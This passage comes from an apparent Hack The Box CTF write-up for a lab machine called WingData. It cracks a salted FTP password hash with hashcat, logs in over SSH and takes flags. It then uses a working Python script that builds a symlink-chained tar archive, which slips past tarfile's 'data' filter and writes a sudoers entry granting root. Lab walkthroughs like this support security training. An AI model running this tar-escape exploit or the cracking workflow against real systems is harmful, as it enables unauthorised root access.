Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1378 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP
Time.Started.....: Sun Mar  1 10:32:13 2026 (15 secs)
Time.Estimated...: Sun Mar  1 10:32:28 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   954.4 kH/s (1.30ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14344192/14344385 (100.00%)
Rejected.........: 0/14344192 (0.00%)
Restore.Point....: 14340096/14344385 (99.97%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: !carolyn ->  ladykitz
Hardware.Mon.#01.: Util: 67%

Started: Sun Mar  1 10:32:12 2026
Stopped: Sun Mar  1 10:32:30 2026
```

**Cracked Password:** `!#7Blushing^*Bride5`<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 Gaining a User Shell

With these credentials, you can now elevate your access. The most stable method is to log in via SSH, which provides a full TTY and avoids the limitations of your current reverse shell.

**Command:** `ssh wacky@ftp.wingdata.htb`

**Output:**

```shell
┌──(kali㉿kali)-[~/pueman/HTB/WingData]
└─$ ssh wacky@ftp.wingdata.htb
wacky@ftp.wingdata.htb's password: 
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 1 10:54:45 2026 from 10.10.14.247
wacky@wingdata:~$
```
<div align="center">
<br>
<br>
</div>

#### 4.3.1 Flag Retrieval

```shell
wacky@wingdata:~$ find / -name user.txt 2>/dev/null
/home/wacky/user.txt
wacky@wingdata:~$ cat /home/wacky/user.txt 
686f215a1ddfa587b49feaf734d81e36
wacky@wingdata:~$ 
```

**User Flag:** ==`686f215a1ddfa587b49feaf734d81e36`==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc

### 5.1 PrivEsc Reconnaissance

With a stable shell, you can now transition to searching for a path to escalate privileges to `root`. Our first goal is to see what "extra powers" we have. Check the sudoers policy to see if there are any cracks in the configuration.

In the world of CTFs and penetration testing, the transition from "Initial Access" to "Root" is all about **System Enumeration**. You find the path forward by asking the system what it allows you to do.
<div align="center">
<br>
<br>
</div>

#### 5.1.1 Auditing Sudo Privileges

**Command:** `sudo -l`

It lists the specific commands the current user is permitted to run with elevated privileges.

**Output:**

```shell
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The `sudo -l` output reveals a powerful privilege escalation vector. The output shows you can execute a specific Python script as the root user without a password. The entry `(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *` indicates that you can run the `python3` interpreter on a specific script with any arguments (represented by the `*` wildcard). That trailing `*` is a major security flaw, as it allows you to pass additional flags or arguments to the script or the Python interpreter if they are not handled securely.

```shell
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py 
```
<div align="center">
<br>
<br>
</div>

#### 5.1.2 Script Analysis (`restore_backup_clients.py`), Discovery and Vulnerability Research

```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

- **The Sink:** It uses `tar.extractall(path=staging_dir, filter="data")`.
    
- **The Vulnerability:** The `*` in the sudoers entry means I can pass any filename.
    
- **The Security Filter:** The `filter="data"` is meant to stop "TarSlip" attacks by blocking links that point outside the destination folder.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>


### 5.2 Execution
#### 5.2.1 The Exploit

```python
import tarfile
import os

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
        
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)
    
    # This points 'escape' to /etc/sudoers.d via the symlink tunnel
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc/sudoers.d"
    tar.addfile(e)

    # Finally, add the exploit file into the 'escape' path
    payload = "wacky ALL=(ALL) NOPASSWD: ALL\n"
    with open("pwn", "w") as f:
        f.write(payload)
    tar.add("pwn", arcname="escape/pwn")
```
<div align="center">
<br>
<br>
</div>

#### 5.2.2 

```shell
wacky@wingdata:~$ vi backup_1338.py
wacky@wingdata:~$ python3 backup_1338.py 
wacky@wingdata:~$ ls
backup_1338.py  backup_9999.tar  pwn  user.txt
wacky@wingdata:~$ cp backup_9999.tar /opt/backup_clients/backups/
wacky@wingdata:~$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_evil
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_evil
wacky@wingdata:~$ sudo su - -c "/bin/bash"

root@wingdata:~# ls
root.txt
root@wingdata:~# cat root.txt 
f2a52d70be65e0aa9d219e4ac344c598
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Conclusion & Remediation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

[^1]: [CVE-2025-47812-poc](https://github.com/4m3rr0r/CVE-2025-47812-poc)
